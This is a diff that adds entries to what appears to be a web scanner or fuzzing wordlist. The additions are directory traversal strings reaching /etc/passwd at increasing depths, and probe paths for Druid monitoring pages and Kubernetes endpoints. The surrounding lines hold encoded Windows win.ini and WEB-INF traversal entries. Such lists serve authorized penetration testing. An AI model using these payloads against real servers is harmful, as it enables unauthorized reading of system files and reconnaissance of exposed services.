@@ -235,6 +235,17 @@ webpage/system/druid/index.html
 ../foo/../../../../../../etc/passwd
 ../foo/../../../../../../../etc/passwd
 
+
+#
+../
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+
 #spring
 ..%5c/..%5c/windows/win.ini
 ..%5c/..%5c/..%5c/windows/win.ini
@@ -278,3 +289,16 @@ invoker/JMXInvokerServlet
 static?/%2557EB-INF/web.xml
 #grafana
 api/snapshots/:key
+#druid
+druid/websession.html
+system/druid/websession.html
+webpage/system/druid/websession.html
+druid/login.html
+system/druid/login.html
+webpage/system/druid/login.html
+
+#K8S
+pods
+healthz
+metrics
+v2/keys
